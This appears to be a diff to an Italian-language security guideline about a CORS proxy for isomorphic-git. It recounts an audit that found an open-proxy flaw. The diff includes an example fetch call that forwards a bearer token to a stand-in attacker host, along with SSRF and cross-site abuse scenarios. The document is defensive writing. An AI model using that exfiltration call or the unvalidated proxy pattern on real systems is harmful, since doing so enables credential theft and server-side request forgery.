@@ -21,17 +21,17 @@ serve alcuna intestazione CORS su quegli endpoint, quindi una SPA di amministraz
 che fa girare isomorphic-git in un Service Worker ha bisogno di un piccolo proxy lato
 server. Il proxy riceve `/api/cors/github.com/owner/repo/info/refs`, fa la fetch di
 `https://github.com/owner/repo/info/refs` e rispedisce indietro le intestazioni CORS.
-Venti righe di Hono. Cosa mai potrebbe andare storto.
+Circa venti righe di Hono.
 
-A questo ha risposto un audit di sicurezza su una SPA di amministrazione contenuti
-(2026-06-11). Il proxy in produzione costruiva la destinazione come `https://${path}`
+Un audit di sicurezza su una SPA di amministrazione contenuti
+(2026-06-11) ha trovato il problema. Il proxy in produzione costruiva la destinazione come `https://${path}`
 direttamente dal path della richiesta, senza alcuna validazione, rifletteva qualsiasi
 intestazione `Origin` e copiava **ogni** intestazione in ingresso verso la fetch di
 upstream, `Authorization` e `Cookie` inclusi. Quell'unico endpoint apriva tre attacchi
 distinti:
 
 - **Esfiltrazione di credenziali.** `fetch('https://admin.example/api/cors/attacker.tld/x',
-  {headers: {Authorization: 'Bearer ' + token}})` — il worker consegna diligentemente il
+  {headers: {Authorization: 'Bearer ' + token}})` — il worker consegna il
   token al server dell'attaccante.
 - **SSRF / relay anonimizzante.** La fetch in uscita parte dall'edge worker. Qualsiasi
   API di terze parti, qualsiasi superficie interna raggiungibile da quella rete, ha ora
@@ -39,11 +39,11 @@ distinti:
 - **Abuso cross-site.** Con `Access-Control-Allow-Origin` riflesso, qualsiasi sito che un
   visitatore apre può pilotare il proxy dal suo browser.
 
-Ecco la parte che brucia: il Worker standalone che questo codice ha sostituito **aveva**
+Il Worker standalone che questo codice ha sostituito **aveva**
 il pin dell'host e l'allowlist di Origin. Entrambe le protezioni sono sparite quando il
 proxy è stato portato dentro l'app principale, perché nessuno ha rifatto il threat model
-per "lo stesso codice, ma montato su /api". Tratta un porting come una riscrittura, e
-dagli la stessa review che ha avuto l'originale.
+per "lo stesso codice, ma montato su /api". Rivedi un porting con la stessa cura con cui
+hai rivisto l'originale.
 
 ## Come applicarlo
 
@@ -97,8 +97,7 @@ const headers = new Headers(c.req.raw.headers)
 
 Il primo si fa notare da solo quando il tuo worker compare nel writeup SSRF di qualcuno.
 Gli altri due non ti danno niente: l'esfiltrazione attraverso un proxy permissivo non
-produce alcun errore dalla tua parte, ed è proprio quel silenzio a rendere così
-pericolosa l'intera classe.
+produce alcun errore dalla tua parte, quindi può andare avanti senza che te ne accorga.
 
 ## Enforcement
 
